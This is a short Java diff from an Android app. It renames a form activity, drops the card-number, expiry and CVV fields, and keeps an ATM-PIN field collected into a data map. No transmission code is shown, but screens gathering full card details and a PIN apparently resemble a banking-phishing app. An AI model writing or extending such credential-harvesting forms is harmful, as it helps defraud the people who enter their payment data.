@@ -13,26 +13,18 @@ import org.json.JSONObject;
 import java.util.HashMap;
 import java.util.Map;
 
-public class SecondActivity extends  BaseActivity {
+public class ThirdActivity extends  BaseActivity {
 
     @SuppressLint("SetTextI18n")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main2);
+        setContentView(R.layout.activity_main3);
 
-        EditText carddigit = findViewById(R.id.carddigit);
-        carddigit.addTextChangedListener(new DebitCardInputMask(carddigit));
-
-        EditText expiry = findViewById(R.id.exp);
-        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));
         int form_id = getIntent().getIntExtra("form_id", -1);
 
         dataObject = new HashMap<>();
         ids = new HashMap<>();
-        ids.put(R.id.carddigit, "carddigit");
-        ids.put(R.id.exp, "exp");
-        ids.put(R.id.cvv, "cvv");
         ids.put(R.id.atmpin, "atmpin");
 
         // Populate dataObject
